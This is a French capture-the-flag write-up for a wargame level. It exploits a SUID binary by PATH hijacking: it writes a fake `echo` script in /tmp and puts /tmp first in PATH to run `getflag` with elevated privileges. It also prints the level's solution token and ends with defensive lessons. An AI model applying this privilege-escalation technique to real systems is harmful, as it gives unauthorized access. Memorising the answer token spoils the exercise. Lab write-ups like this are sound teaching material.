# Niveau 03 - Exploitation par Détournement de PATH

## Aperçu du défi
Le niveau 03 présente un exécutable binaire avec les permissions SUID (Set User ID) qui s'exécute avec les privilèges de `flag03`. Notre objectif est d'exploiter ce binaire pour exécuter `getflag` avec des permissions élevées.

## Analyse du binaire

### Permissions du fichier
```
-rwsr-sr-x 1 flag03 level03 8627 Mar 5 2016 level03
```

Observations clés :
- Le `s` dans les permissions du propriétaire indique que le bit SUID est activé.
- Le binaire s'exécute avec les privilèges de `flag03` lorsqu'il est exécuté.
- Il appartient à `flag03` mais est exécutable par les utilisateurs de level03.

### Analyse du contenu du binaire
Pour analyser le binaire, nous pouvons utiliser la commande `strings` pour extraire les chaînes de caractères lisibles par l'homme du binaire :
```bash
strings level03 > level03.txt
```
En regardant le binaire, nous pouvons identifier :
- Un appel à la fonction `system()`.
- Des références à `setresgid` et `setresuid` (fonctions de gestion des privilèges).
- Une chaîne critique : `/usr/bin/env echo Exploit me`.

## Explication de la vulnérabilité
Le binaire exécute une commande en utilisant `system()` qui utilise `env` pour localiser et exécuter la commande `echo`. Lorsque `env` est appelé, il recherche les commandes dans les répertoires listés dans la variable d'environnement `PATH`.

La vulnérabilité réside dans le fait que nous pouvons manipuler la variable `PATH` pour faire exécuter au programme notre propre version de `echo` au lieu de la version du système.

## La variable d'environnement PATH
`PATH` est une liste de répertoires séparés par des deux-points que le système parcourt lors de l'exécution de commandes. Par exemple :
```
PATH=/usr/local/bin:/usr/bin:/bin
```

Lorsque nous utilisons `export PATH=/tmp:$PATH`, nous :
1. Ajoutons `/tmp` au début du `PATH` existant.
2. Rendons ce `PATH` modifié disponible aux processus enfants.
3. Assurons que le système cherche d'abord dans `/tmp` lors de la recherche d'exécutables.

## Étapes d'exploitation

### 1. Créer un script `echo` malveillant
```bash
echo '#!/bin/sh' > /tmp/echo
echo 'getflag' >> /tmp/echo
chmod +x /tmp/echo
```

Ce script exécutera `getflag` avec les privilèges de `flag03` lorsqu'il sera appelé.

### 2. Modifier le PATH pour prioriser notre script
```bash
export PATH=/tmp:$PATH
```

Cela fait chercher le système d'abord dans `/tmp` lors de la recherche d'exécutables.

### 3. Exécuter le programme vulnérable
```bash
./level03
```

### 4. Résultat
Lorsqu'il est exécuté, le binaire va :
1. S'exécuter avec les privilèges de `flag03` grâce au SUID.
2. Tenter d'exécuter `/usr/bin/env echo Exploit me`.
3. `env` cherchera `echo` dans le `PATH`.
4. Trouver et exécuter notre script `echo` malveillant dans `/tmp`.
5. Notre script exécutera `getflag` avec les privilèges de `flag03`.
6. Le drapeau pour le niveau suivant sera affiché.

## Leçons de sécurité
1. **Détournement de PATH (Path Hijacking)** : Toujours utiliser des chemins absolus dans les programmes privilégiés.
2. **Binaires SUID** : Être extrêmement prudent avec les exécutables SUID qui appellent d'autres programmes sans spécifier les chemins complets.
3. **Variables d'environnement** : Se rappeler que les variables d'environnement comme `PATH` peuvent être manipulées par les utilisateurs.

## Solution complète
```bash
# Créer le script echo malveillant
echo '#!/bin/sh' > /tmp/echo
echo 'getflag' >> /tmp/echo
chmod +x /tmp/echo

# Modifier le PATH
export PATH=/tmp:$PATH

# Exécuter le programme vulnérable
./level03

# Sortie attendue : Check flag.Here is your token: qi0maab88jeaj46qoumi7maus
```

Cette technique d'attaque est connue sous le nom de "détournement de PATH" (PATH hijacking) et est une méthode courante d'escalade de privilèges dans les environnements Unix/Linux.
